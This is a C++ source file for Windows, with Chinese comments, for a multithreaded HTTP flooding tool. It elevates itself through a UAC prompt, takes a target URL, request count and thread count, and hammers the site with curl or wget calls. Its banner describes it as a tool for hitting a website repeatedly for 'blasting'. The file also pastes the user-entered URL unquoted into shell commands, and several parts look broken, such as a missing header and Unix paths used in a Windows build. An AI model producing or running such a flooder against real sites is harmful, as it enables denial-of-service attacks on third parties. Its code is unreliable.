#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <stdexcept>
#include <regex>
#include <atomic>
#include <Windows.h>
using namespace std;
bool IsUserAdmin() {
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	b = AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdministratorsGroup);
	if (b) {
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) {
			b = FALSE;
		}
		FreeSid(AdministratorsGroup);
	}
	return b == TRUE;
}

// 封装自动申请管理员权限及后续操作的函数
void RequestAdminAndExecute() {
	if (!IsUserAdmin()) {
		// 获取当前可执行文件的完整路径
		wchar_t szPath[MAX_PATH];
		GetModuleFileNameW(NULL, szPath, MAX_PATH);
		
		// 重新以管理员权限启动程序
		SHELLEXECUTEINFOW sei = { sizeof(sei) };
		sei.lpVerb = L"runas";
		sei.lpFile = szPath;
		sei.nShow = SW_SHOWNORMAL;
		
		if (!ShellExecuteExW(&sei)) {
			DWORD dwError = GetLastError();
			if (dwError == ERROR_CANCELLED) {
				std::wcout << L"用户取消了 UAC 提示。" << std::endl;
			} else {
				std::wcout << L"以管理员权限启动程序时出错，错误代码: " << dwError << std::endl;
			}
			exit(0);
		}
		exit(0);
	}
	
	// 这里可以添加需要管理员权限执行的代码
	std::wcout << L"已获取管理员权限，可执行需要管理员权限的操作。" << std::endl;
}


// 执行系统命令并返回输出 - 优化版本
std::string exec(const char* cmd) {
	std::array<char, 4096> buffer; // 增大缓冲区
	std::string result;
	FILE* pipe = popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
			result += buffer.data();
		}
	} catch (...) {
		pclose(pipe);
		throw;
	}
	pclose(pipe);
	return result;
}

// 检查系统是否存在指定命令 - 改进版本
bool commandExists(const std::string& cmd) {
	std::string checkCmd;

#ifdef _WIN32
	checkCmd = "where " + cmd + " >nul 2>nul";
#else
	checkCmd = "command -v " + cmd + " >/dev/null 2>&1 || { echo >&2 \"Not found\"; exit 1; }";
#endif

	int result = std::system(checkCmd.c_str());
	return (result == 0);
}

// 获取命令的完整路径
std::string getCommandPath(const std::string& cmd) {
	std::string pathCmd;

#ifdef _WIN32
	pathCmd = "where " + cmd;
#else
	pathCmd = "which " + cmd;
#endif

	try {
		std::string output = exec(pathCmd.c_str());
		if (!output.empty() && output.back() == '\n') {
			output.pop_back();
		}
		return output;
	} catch (...) {
		return "";
	}
}

// 执行单个HTTP请求 - 优化版本
bool sendRequest(const std::string& url, std::atomic<int>& successCount, bool verbose = false) {
	static std::string cmd;
	static std::string toolName;
	static bool initialized = false;

	// 只初始化一次命令
	if (!initialized) {
		if (commandExists("curl")) {
			toolName = "curl";
			cmd = "curl -s -o /dev/null -w '%{http_code}' " + url;
		} else if (commandExists("wget")) {
			toolName = "wget";
			cmd = "wget -q -O /dev/null --server-response " + url + " 2>&1 | grep 'HTTP/' | tail -1 | awk '{print $2}'";
		} else {
			std::cerr << "错误: 系统中既没有curl也没有wget" << std::endl;
			return false;
		}
		initialized = true;
	}

	if (verbose) {
		std::cout << "使用 " << toolName << "，路径: " << getCommandPath(toolName) << std::endl;
		std::cout << "执行命令: " << cmd << std::endl;
	}

	try {
		std::string output = exec(cmd.c_str());

		if (verbose) {
			std::cout << "命令输出: " << output << std::endl;
		}

		std::regex httpCodeRegex("^2\\d\\d$");
		if (std::regex_search(output, httpCodeRegex)) {
			successCount.fetch_add(1, std::memory_order_relaxed);
			return true;
		} else {
			std::cerr << "收到的HTTP状态码: " << output << std::endl;
		}
	} catch (const std::exception& e) {
		std::cerr << "执行命令时发生异常: " << e.what() << std::endl;
	}

	return false;
}

int main() {
	std::cout<<"该程序需要管理员权限方可正常运行。\n";
	RequestAdminAndExecute();//自动申请管理员权限
	std::string url;
	int totalRequests;
	bool verbose = false;
	std::cout << "该工具可以帮助频繁访问某网站。爆破用。By FrankWkd\n";
	std::cout << "请输入目标网址 (例如: http://example.com): ";
	std::getline(std::cin, url);

	if (url.empty() || (url.find("http://") != 0 && url.find("https://") != 0)) {
		std::cerr << "错误: 网址格式不正确，请以 http:// 或 https:// 开头" << std::endl;
		return EXIT_FAILURE;
	}

	std::cout << "请输入要发送的请求总数: ";
	while (!(std::cin >> totalRequests) || totalRequests <= 0) {
		std::cin.clear();
		std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
		std::cerr << "错误: 请求数必须是正整数，请重新输入: ";
	}

	std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');

	std::cout << "是否启用详细模式？(y/n): ";
	char answer;
	std::cin >> answer;
	verbose = (answer == 'y' || answer == 'Y');
	std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');

	std::cout << "\n开始访问网站: " << url << std::endl;
	std::cout << "总请求数: " << totalRequests << std::endl;

	// 增加线程数以提高并发度
	unsigned int threadCount = std::thread::hardware_concurrency() * 2;
	std::cout<<"线程数：";
	std::cin>>threadCount;

	std::cout << "使用 " << threadCount << " 个线程" << std::endl;
	std::cout<<"3秒后开始\n";
	Sleep(3000);
	if (!commandExists("curl") && !commandExists("wget")) {
		std::cerr << "错误: 系统中没有curl或wget工具。请至少安装其中一个。" << std::endl;
		return EXIT_FAILURE;
	}

	int requestsPerThread = totalRequests / threadCount;
	int remainingRequests = totalRequests % threadCount;

	std::vector<std::thread> threads;
	std::atomic<int> successCount(0); // 使用原子计数器减少锁竞争

	auto worker = [&](int threadId, int requestCount) {
		for (int i = 0; i < requestCount; ++i) {
			bool result = sendRequest(url, successCount, verbose);

			// 减少不必要的休眠，提高吞吐量
			if (i % 1000 == 0) {
				std::this_thread::sleep_for(std::chrono::milliseconds(1));
			}

			if (verbose && i % 100 == 0 && i > 0) {
				std::cout << "线程 " << threadId << " 已处理 " << i << " 个请求" << std::endl;
			}
		}
	};

	auto startTime = std::chrono::high_resolution_clock::now();

	for (int i = 0; i < threadCount; ++i) {
		int count = (i < remainingRequests) ? requestsPerThread + 1 : requestsPerThread;
		threads.emplace_back(worker, i, count);
	}

	for (auto& t : threads) {
		t.join();
	}

	auto endTime = std::chrono::high_resolution_clock::now();
	auto duration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime).count();

	std::cout << "\n请求发送完成" << std::endl;
	std::cout << "总成功请求数: " << successCount << " / " << totalRequests << std::endl;
	std::cout << "耗时: " << duration << " 秒" << std::endl;
	if (duration > 0) {
		std::cout << "每秒请求数: " << static_cast<double>(successCount) / duration << std::endl;
	}
	system("pause");
	return EXIT_SUCCESS;
}
